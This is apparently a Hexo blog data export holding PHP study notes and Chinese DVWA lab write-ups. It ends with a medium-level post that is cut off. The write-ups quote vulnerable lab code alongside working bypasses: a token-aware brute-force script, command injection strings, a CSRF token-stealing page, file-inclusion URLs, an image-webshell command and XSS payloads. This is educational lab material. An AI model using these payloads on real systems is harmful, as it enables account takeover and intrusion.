{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"黑桃⑨","url":"https://perfect.xyz"},"pages":[{"title":"关于我","date":"2018-07-07T08:12:41.199Z","updated":"2018-07-07T08:12:41.199Z","comments":true,"path":"about/index.html","permalink":"https://perfect.xyz/about/index.html","excerpt":"","text":"目前还是个在校生，而且是个菜鸡 努力学web安全中，对逆向也有点感兴趣 二刺猿死肥宅 单机游戏玩家 QQ:1055883471欢迎各路大佬加我好友"}],"posts":[{"title":"php学习笔记-基础部分","slug":"phpstudy-1","date":"2018-07-13T08:13:35.753Z","updated":"2018-07-13T11:20:04.394Z","comments":true,"path":"2018/07/13/phpstudy-1/","link":"","permalink":"https://perfect.xyz/2018/07/13/phpstudy-1/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php PHP基本语法php是一种服务器端嵌入html脚本语言，也就是说可以将php标签嵌入到html代码中 语法规则php每条语句后面必须有“;” php中的变量名必须区分大小写，函数名、方法名、类名不区分 PHP标记①&lt;?php ...?&gt; ②&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; ③&lt;? ... ?&gt; (默认关闭，需要手动开启) ④&lt;% ... %&gt; (默认关闭，需要手动开启) 在php.ini中开启 注释单行注释：//注释内容 多行注释：/*注释内容*/ 变量及操作概念变量是内存中用于临时存储数据的一个空间，这个空间有一个名字，名字就是变量名。变量名是用于对这个内存中的数据进行引用的。 变量语法： $变量名=值;说明： php中的变量必须以”$”开头 变量名只能包含字母、数字、下划线，只能以字母、下划线开头。 删除变量语法: unset(变量名) 可变变量1.通过一个变量来访问另一个变量 &lt;?php $v = &apos;age&apos; $age = &apos;20&apos; echo $v; echo $$v; ?&gt; 结果： age 20 2.通过一个变量来创建另一个变量 &lt;?php $v = &apos;age&apos; $vv = &apos;20&apos; echo $age; ?&gt; 结果： 20 预定义变量php为了我们预先定义了一组变量，这些变量会在不同的需求中使用 $_GET 用于前台表单使用get方式提交的数据 $_POST 用于前台表单使用post方式提交的数据 $_REQUEST 用于前台表单使用get或post方式提交的数据 $_SERVER 记录了服务器端与客户端的相关信息 $_COOKIE 一种会话技术 $_SESSION 一种会话技术 $_FILES 用于记录用户上传的文件信息 $_GLOBAL 用于记录全局变量 使用方法： print_r($_SERVER) 内存原理内存结构栈区保存的是变量名（术语称之为引用） 特点：对于CPU来说，读写速度是最快的 堆区存储的是是“复杂”的数据，比如数据、对象、字符串 数据段分为全局数据段和静态数据段 存储的是简单的数据，比如整型、浮点型、布尔值 （计算机能存储的最大整数为2147483647） 代码段存储的是源代码对应的机器指令 输出缓存只要是有输出指令，比如echo、print、var_dump。这些指令会将所有要输出的数据放在输出缓存中 php执行过程编译阶段进行语法检查、词法检查、代码优化 编译通过之后将源代码转换为机器指令 Parse error：编译阶段发生错误，语法有问题 执行阶段如果编译通过后，会将源代码对应的机器指令，保存在代码段，再开始执行代码段中的机器指令 例如： &lt;?php $v1 = 10; $v2 = $v1; $v2 = 20; echo $v1; ?&gt; 执行过程如下: 1、先通过编译阶段，将源代码存储在代码段中。 2、执行$v1=10，会在栈区开辟一个空间存储变量$v1，将数据保存到数据段的全局区，再将数据的物理地址赋给栈区的变量$v1。 3、执行$v2=$v1，在栈区开辟一个空间存储变量$v2，读取变量$v1的值，读取出来的数据保存在数据段全局区，将这个数据的地址赋值给栈区中的$v2。 4、执行$v2=20，找到栈区中的$v2，并根据地址找到数据段全局区对应的空间，将数据覆盖。 5、执行echo $v1，找到栈区中的变量$v1，并根据地址找到数据段全局区中的值，将值读取出来，并放入到输出缓存中。 6、程序执行结束，输出缓存中的数据会自动返回给apache，apache返回给浏览器，同时栈区、数据段、代码段中的数据会被系统清空 PHP嵌入到HTML的执行过程php功能模块在处理一个php文件时，它只会处理php代码，对于非php代码，它会原样输出 到输出缓存中，由输出缓存发给apche来解析html以及js代码等php仅处理&lt;?php?&gt;标签内的代码，js、html、css对php来说都是字符串 php中变量的传值方式赋值传值使用一个变量a为另一个变量b赋值时，传递的是变量a的值，这种赋值方式称为赋值传值 $a = 10 $b = $a echo $b 结果： 10 引用传值使用一个变量a为另一个变量b赋值时，传递的是变量a的地址，这种赋值方式称为引用传值 $a = 10; $b = &amp;$a; $b = 20; echo $a,$b; 结果： 20,20 执行$b = &amp;$a;时，由于多了一个&amp;符号，所以内存会在栈区中开辟一个空间存储变量$b,并将$a的物理地址赋值给$b。 执行$b = 20;时，根据$b的物理地址找到数据段全局区中的数据并覆盖，由于$a的物理地址也是这个地址，所以$a的值也被改为20。 常量常量是一种特殊的变量，也是用于存储数据。常量一旦定义就不允许修改其值，常量本身不允许删除 概念define（’常量名’，值）； const 常量名 = 值； 常量一旦被定义就不允许更改 常量的值只能是基本数据类型（标量数据类型） 常量默认区分大小写，一般常量在没命时，我们会使用全大写的形式 区别： define允许在分支结构（比如循环语句）中定义常量，但是const不允许 define在值后面加一个true，定义的常量将不区分大小写 常量的判断以及获取所有的常量常量的判断defined（‘常量名’） 比define多了一个d，判断返回布尔值 获取所有常量get_defined_constants(); 获取php中所有的常量 魔术常量__FILE__ 用于获取当前文件路径以及文件名 __DIR__ 用于获取当前文件的路径 __LINE__ 用于获取当前行号 __FUNCTION__用于获取函数的函数名 __METHOD__ 用于获取当前方法的方法名 __CLASS__ 用于获取当前类的类名 __NAMESPACE__用于获取当前空间的空间名 PHP中的数据类型数据类型的分类1.标量数据类型 int 整型 float 浮点型 boolean 布尔型string 字符串 2.复合数据类型 array 数组object 对象 3.特殊数据类型 null nullresource 资源类型 int型十进制$v=255 八进制以0开头，并且不能有超过7的数字 十六进制以0x开头，包含0-9、a-f 其他进制在显示时会自动转换为十进制 float型有小数点的数就成为浮点数 浮点数不可能在不丢失精度的情况下转为二进制格式，所以使用浮点数进行运算的时候会出现偏差 string型字符串即单引号或者双引号括起来的0个或多个字符 单引号在单引号内能被转义的字符串：\\’、\\\\ 单引号定义的字符串中的变量值不能被解析 双引号在双引号内能被转义的字符串：\\”、\\t、\\r、\\n、\\\\、\\$ 双引号定义的字符串中的变量值可以被解析（加{}可以插入变量） heredoc类似于双引号定义字符串，主要用于定义大段的字符串语法： $heredoc = &lt;&lt;&lt;开始标记 大段文本 结束标记； 开始标记和结束标记必须相同 结束标记必须定格写 array型索引数组 数组元素下标是数值，这样的数组就是索引数组 关联数组 数组元素的下标是字符串，这样的数组就是管理数组 数组元素的访问$a = “\\&lt;h3>$_arry[AAA]\\&lt;/h3>“ or $a = “\\&lt;h3>{$_arry[‘AAA’]}&lt;/h3>“ 如果在一个字符串中想输出数组的元素，那么下标不需加引号 如果使用了{}来限制了数组，那么下标必须加引号 资源类型资源型数据类型是一个特殊的变量，程序员没有办法直接定义一个资源，必须使用php提供的函数获取资源。不被php管辖的变量都称为资源，比如与mysql的连接 $resource = fopen(&apos;data.txt&apos;,&apos;r&apos;); echo fgets($resource); 以读的方式打开data.txt，并将内容echo出来，$resource就是一个资源型数据 数据类型的转换自动转换当进行运算的两个数据类型不同的时候，php会进行自动转换 强制转换(interger)变量 将其他数据类型强制转换为整型(float)变量 将其他数据类型强制转换为浮点型(array)变量 将其他数据类型强制转换为数组(object)变量 将其他数据类型强制转换为对象(string)变量 将其他数据类型强制转换为字符串(boolean)变量 将其他数据类型强制转换为布尔值","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"基于DVWA的web漏洞原理-high","slug":"dvwa-high","date":"2018-07-07T05:58:37.767Z","updated":"2018-07-13T11:17:30.717Z","comments":true,"path":"2018/07/07/dvwa-high/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-high/","excerpt":"有点骚♂","text":"有点骚♂ Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 净化用户名输入 $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化密码输入 $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 服务器端代码加入了Token来抵御CSRF攻击以及无脑爆破，同时加入了mysqli_real_escape_string以及stripslashes函数来防止sql注入 anti-CSRF Token的原理是当用户访问时，生成一个随机的token，每当用户提交时，在服务器端比对一下token值是否正确 虽然加入了防爆破机制，但也只是防止了bp的无脑爆破，可以通过Python脚本来爆破，下面贴一个网上来找来的pyton脚本 from bs4 import BeautifulSoup import urllib2 header={ ‘Host’: ‘192.168.153.130’, ‘Cache-Control’: ‘max-age=0’, ‘If-None-Match’: “307-52156c6a290c0”, ‘If-Modified-Since’: ‘Mon, 05 Oct 2015 07:51:07 GMT’, ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36’, ‘Accept’: ‘/‘, ‘Referer’: ‘http://192.168.153.130/dvwa/vulnerabilities/brute/index.php&#39;, ‘Accept-Encoding’: ‘gzip, deflate, sdch’, ‘Accept-Language’: ‘zh-CN,zh;q=0.8’, ‘Cookie’: ‘security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2’}requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot; def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,”html.parser”) user_token = soup.form.input.input.input.input[“value”] #get the user_token return user_tokenuser_token = get_token(requrl,header) i=0 for line in open(“rkolin.txt”): requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i = i+1 print i,’admin’,line.strip(), user_token = get_token(requrl,header) if (i == 10): break Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = trim($_REQUEST[ &apos;ip&apos; ]); // 设置黑名单 $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 服务器端设置了黑名单，将非法的字符删除为空字符 看似过滤了所有的非法字符，但是实际上是把’| ‘替换为空字符，而服务器执行命令时是自上而下执行的，所以把管道符改为||时，比如127.0.0.1 || net user，服务器从上往下，删除掉一个’| ‘后，原来的命令就变为127.0.0.1 | net user，结果还是一样的 当然直接用127.0.0.1|net user，也可以绕过 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 由于加入了Anti-CSRF token机制，所以当我们要攻击时，就必须先获取token 构造html页面： &lt;script type=&quot;text/javascript&quot;&gt; function attack() { document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;iframe src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt; &lt;/iframe&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 当受害者访问这个页面时，脚本会在后台访问修改密码的页面，获取页面中的token，并向服务器发送修改密码的请求 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数 $file = $_GET[ &apos;page&apos; ]; // 输入检查 if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // 当输入的参数有误时 echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; fnmatch() 函数根据指定的模式来匹配文件名或字符串。 服务器端加入了检测机制，输入的page参数必须带有file才能包含 我们可以利用file协议绕过，当浏览器访问一个本地的文件时，封装的协议就是file://构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=file:///D:\\phpStudy\\WWW\\phpinfo.phppage后面跟的参数为想要访问的文件的绝对路径 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // 检查是否为img if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; getimagesize() 函数用于获取图像大小及相关信息 每种格式的图片都会有各种的特征，getimagesize函数就是用于检查上传的图片是否有规定的特征 然而上传的jpg和png文件不像gif那样，直接在最前面添加一个gif89a就能绕过，所以我们需要制作一个图片木马 制作方法： cmd输入:copy 图片.jpg/b+木马.php/a 图片木马.jpg 将图片.jpg和木马.php合并并保存为图片木马.jpg 上传到服务器之后用菜刀之类的工具连接 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; ) ){ // 验证成功，检查两次输入的密码是否一致 if ($pass_new == $pass_conf) { $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } else { // 验证码验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 验证的逻辑就是当参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，认为输入错误 直接用bp抓包，将User-Agent值改为于reCAPTCHA，并在参数栏里加一个recaptcha_response_field=hidd3n_valu3即可 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_SESSION [ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_SESSION[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 获取值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器在查询数据时加入了LIMIT 1，只输出一条结果 由于没有过滤注释符，所以只要在参数后面加一个#就可以绕过，或者是将or前面的值改为0，即查不到这个id，那服务器就会把or后面的值作为输出 high级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_COOKIE[ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_COOKIE[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 打乱Sleep函数的沉睡时间 if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // 没有找到用户，返回错误 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep，其结果是扰乱了时间盲注 既然时间盲注用不了，那就用布尔盲注就好 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { if (!isset ($_SESSION[&apos;last_session_id_high&apos;])) { $_SESSION[&apos;last_session_id_high&apos;] = 0; } $_SESSION[&apos;last_session_id_high&apos;]++; $cookie_value = md5($_SESSION[&apos;last_session_id_high&apos;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&apos;HTTP_HOST&apos;], false, false); } ?&gt; 这里将cookie的值进行了md5打散，并且还设置了期限之类进一步增加SessionID的安全性，但不足的是进行md5散列的值是0的累加，只要收集大量的SessionID，把SessionID拿去md5解密之后就能找到其规律 之后的步骤同Low XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # 设置白名单 switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 虽然设置了白名单，但是没有过滤注释符，跟medium一样，加入#就行http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English#default==English%20%3Cscript%3Ealert(/xss/)%3C/script%3E XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; preg_replace函数执行一个正则表达式的搜索和替换 服务器加入了黑名单过滤输入，防御了双写和大小写绕过 虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。输入&lt;img src=1 onerror=alert(/xss/)&gt;即可弹窗 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 跟反射型一样，虽然用正则表达式过滤了&lt;script&gt;标签，但是没有img、iframe等其它标签 用bp抓包，改name的参数为&lt;img src=1 onerror=alert(1)&gt;即可弹窗","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-medium","slug":"dvwa-medium","date":"2018-07-07T05:42:47.016Z","updated":"2018-07-13T11:17:35.227Z","comments":true,"path":"2018/07/07/dvwa-medium/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-medium/","excerpt":"low完了，medium就很快了","text":"low完了，medium就很快了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 去掉输入的用户名中的特殊字符 $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 去掉输入的密码中的特殊字符 $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = 